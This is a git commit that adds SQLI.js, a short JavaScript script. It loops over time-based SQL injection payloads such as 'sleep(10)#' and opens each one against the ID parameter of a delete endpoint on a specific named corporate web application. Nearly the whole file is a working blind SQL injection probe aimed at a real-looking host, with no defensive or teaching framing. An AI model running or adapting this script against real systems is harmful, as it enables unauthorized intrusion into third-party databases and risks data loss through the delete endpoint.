c436aa9515b36dc79c3dd2638364022929a3da93
yealvarez <56172878+yealvarez@users.noreply.github.com>
2022-01-18 17:55:06 -0500

    Create SQLI.js

---
+++ SQLI.js
@@ -0,0 +1,16 @@
+function openInNewTab(href) {
+  Object.assign(document.createElement('a'), {
+    target: '_blank',
+    href: href,
+  }).click();
+}
+let diccionario = ["'sleep(10)#","1+or+sleep(10)#","or+sleep(10)#",]
+
+for (i = 0; i < diccionario.length; i++) {
+  
+  var url='https://webapps.dev.slb.com/vtd/CenterDelete.cfm?ID=2'+diccionario[i]+'&Table=TABCompletionStatus&View=%2A&BackUrl=Table%3DTABCompletionStatus';
+  //window.open(url, '_blank');
+  setTimeout(openInNewTab(url), 2000);
+  console.log(url); 
+}
+==================================================================
